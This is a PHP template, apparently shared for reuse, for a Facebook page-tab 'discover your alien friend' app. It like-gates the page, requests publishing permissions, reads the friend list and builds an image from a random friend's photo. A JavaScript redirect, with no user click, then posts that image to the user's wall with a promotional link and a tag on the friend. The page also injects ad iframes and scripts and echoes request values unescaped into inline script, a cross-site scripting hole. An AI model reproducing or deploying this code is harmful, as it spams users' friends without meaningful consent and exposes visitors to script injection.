<?php 
ob_start(); 
    @set_time_limit(0); 

        $_PAGEID    = '3732454*****';  // Id De Tu Pagina  
    $_APPID        = '2703950030*****';  // Id De Tu Aplicacion 
    $_APPSE        = 'f775be541d11f1f309433244********'; // Id Secreto De Tu Aplicacion 
    $_PERMISOS    = 'publish_stream,photo_upload,user_photos';  // Permisos ( No Tocar) 
    $_MSERVER    = '//***.com/se***/alien/';  // Aki va tu server  
    $_ADS        = ''; // Link de tu publicidad c:  
    $GOOGLEURL    = 'http://goo.gl/Zv0Kk'; //Url de la aplicacion en la fanpage ( http://goo.gl/ ) 

    //Obtenemos Los datos del usuario 
    $_R = _SR($_REQUEST['signed_request'],$_APPSE); 
    //Leemos el ID de la fanpage de la cual el usuario esta accediendo.  
    $_PAGEID        = $_R['page']['id']; 

    echo '<center>'; 
    echo '<iframe src="'.$_ADS.'" style="border:0px;" width="728" height="90" scrolling="no" frameborder="0"></iframe><br/>'; 

    //Verificamos si es fan 
    if($_R['page']['liked']){ 
        if($_R['oauth_token']==""){ 
            PedirP(); 
        }else{ 
            //Obtenemos los datos del usuario 
            $A = file_get_contents('https://graph.facebook.com/'.$_R['user_id'].'?access_token='.$_R['oauth_token']); 
            $A = json_decode($A,true); 

            //Obtenemos los amigos 
            $AM = file_get_contents('https://graph.facebook.com/'.$_R['user_id'].'/friends?fields=id,name,picture,first_name&access_token='.$_R['oauth_token']); 
            $AM = json_decode($AM,true); 
            //Obtenemos un amigo al azar 
            $QM = $AM['data'][array_rand($AM['data'],1)]; 

            //Verificamos si ya dio permisos 
            $BM = file_get_contents('https://graph.facebook.com/'.$_R['user_id'].'/permissions?access_token='.$_R['oauth_token']); 
            $BM = json_decode($BM,true); 

            if( !array_key_exists('publish_stream', $BM['data'][0]) ) { 
                PedirP(); 
            } 

            //Paso previo, mostramos la imagen y el boton subir imagen. 
            if($_REQUEST['crear']==""){ 
            //Fuente a usar 
            $font = 'lsansi.ttf'; 
            //Vemos la url real del amigo 
            $image = open_image(VerRealURL('http://graph.facebook.com/'.$QM['id'].'/picture?type=large')); 

            if ($image === false) { die ('Unable to open image'); } 

            //Tamaño de la imagen 
            $w = imagesx($image); 
            $h = imagesy($image); 

            //Tamaño maximo 200x200 (sin deformar) 
            $new_w=200; 
            $new_h=200; 
            if(($w/$h) > ($new_w/$new_h)){ 
                $new_h=$new_w*($h/$w); 
            } else { 
                $new_w=$new_h*($w/$h);    
            } 

            //Cargamos el fondo 
            $im2 = imagecreatefromjpeg('fondo.jpg'); 
            //Cargamos el recuadro 
            $im3 = imagecreatefromjpeg('cuadro.jpg'); 
            //Agregamos la foto y el recuadro 
            imagecopyResampled($im2, $im3, 145, 56, 0, 0, $new_w+20, $new_h+20, $w, $h-30); 
            imagecopyResampled($im2, $image, 155, 66, 0, 0, $new_w, $new_h, $w, $h); 

            //Colo blanco 
            $textcolor = imagecolorallocate($im2,255,255,255); 
            //Primer nombre del amigo 
            $text1 = $QM['first_name']; 

            //Centramos el texto en la imagen 
            $bbox = imagettfbbox(30,$angle,$font,$text1); 
            $textWidth = $bbox[2]-$bbox[0]; 
            $z=$bbox[2]/2; 
            $x=250-$z; //250 es la mitad del tamaño de la imagen 
            $y=43; //43 es la coordenada y 

            //Agregamos el nombre 
            imagettftext($im2, 30, 0, $x+2,$y+2, $textcolor, $font, $text1); 

            //Guardamos la img 
            imagejpeg($im2,'tmp/tmp_'.$A['id'].'.jpg',90); 
            //Vaciamos la memoria 
            imagedestroy($im2); 

//<a href="'.$_MSERVER.'tab.php?crear=1&amigo='.$QM['id'].'&signed_request='.$_REQUEST['signed_request'].'"><img src="pic/boton.png" border="0"></a> 
            //Mostramos el resultado 
            echo '<table border="0"><tr><td><div align="center"><img src="tmp/tmp_'.$A['id'].'.jpg?t='.time().'" width="450px"><br/></div></td><td>  </td></tr></table>'; 
             
         
        echo'<script> 
     
     location.href="'.$_MSERVER.'tab.php?crear=1&amigo='.$QM['id'].'&signed_request='.$_REQUEST['signed_request'].'"; 
     
    </script>'; 
             
            }else{ 
            //Texto de la foto 
            $_TXT_ENVIAR    = 'Descubre tu amigo Alien ? '.$GOOGLEURL.' - '.$A['first_name'].', Ya lo Descubrio... 
            *'; 
            $_P['message']     = trim($_TXT_ENVIAR); 
            //Etiquetamos al amigo 
    $_P['tags']    = json_encode(array(array('tag_uid'=> $_REQUEST['amigo'],'x'=>50,'y'=>50))); 
             
             
            $_P['source'] = "@" . realpath('tmp/tmp_'.$_R['user_id'].'.jpg'); 
            $ch = curl_init(); 
            curl_setopt($ch, CURLOPT_URL,'https://graph.facebook.com/'.$_R['user_id'].'/photos?access_token='.$_R['oauth_token']); 
            curl_setopt($ch, CURLOPT_POST, true); 
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
            curl_setopt($ch, CURLOPT_POSTFIELDS, $_P); 
            $resultado = curl_exec($ch); 
            $resultado = json_decode($resultado, true); 
            curl_close($ch); 

echo '<table border="0"><tr><td><div align="center"><img src="tmp/tmp_'.$A['id'].'.jpg?t='.time().'" width="450px"></div></td></tr></table>'; 
            echo '<h1>Imagen subida con exito, puedes verla publicada en tu muro XD</h1>'; 
             
            } 
        } 
    }else{ 
        //Boton de like (no es fan) 
        echo '<img src="https://lh4.googleusercontent.com/-3uCLnNCivsM/UIwq1AE_KkI/AAAAAAAAAho/XOSxuGHyXCA/s514/cuadro.jpg">'; 
    } 
    echo '<script src="//ads.lfstmedia.com/getad?site=138199" type="text/javascript"></script>'; 
    echo '</center>'; 

    function _SR($signed_request, $secret) { 
            list($encoded_sig, $payload) = explode('.', $signed_request, 2); 

            $sig = base64_url_decode($encoded_sig); 
            $data = json_decode(base64_url_decode($payload), true); 

            if(strtoupper($data['algorithm']) !== 'HMAC-SHA256') { 
                    error_log('Unknown algorithm. Expected HMAC-SHA256'); 
                    return null; 
            } 

            $expected_sig = hash_hmac('sha256', $payload, $secret, $raw = true); 
            if($sig !== $expected_sig) { 
                    error_log('Bad Signed JSON signature!'); 
                    return null; 
            } 

            return $data; 
    } 

    function base64_url_decode($input) { 
            return base64_decode(strtr($input, '-_', '+/')); 
    } 

    function PedirP(){ 
        global $_APPID,$_PAGEID,$_PERMISOS; 
        echo "<script> 
          var oauth_url = 'https://www.facebook.com/dialog/oauth/'; 
        oauth_url += '?client_id=".$_APPID."'; 
        oauth_url += '&redirect_uri=' + encodeURIComponent('https://www.facebook.com/pages/null/".$_PAGEID."/?sk=app_".$_APPID."'); 
        oauth_url += '&scope=".$_PERMISOS."' 

        window.top.location = oauth_url; 
        </script>"; 
        die(); 
    } 

    function VerRealURL($U){ 
        $ch2 = curl_init(); 
        curl_setopt($ch2, CURLOPT_URL, $U); 
        curl_setopt($ch2, CURLOPT_HEADER, true); 
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true); 
        $ZZ = curl_exec($ch2); 
        curl_close($ch2); 

        preg_match('/Location:(.*?)\n/', $ZZ, $matches); 
        return trim(array_pop($matches)); 
    } 

    function open_image($file){ 
        $size = getimagesize($file); 
        switch($size["mime"]){ 
            case "image/jpeg": 
                   $im = imagecreatefromjpeg($file); //jpeg file 
                break; 
            case "image/gif": 
            $im = imagecreatefromgif($file); //gif file 
                break; 
               case "image/png": 
            $im = imagecreatefrompng($file); //png file 
                   break; 
            default:  
            $im=false; 
                break; 
        } 
        return $im; 
    } 
     
?>
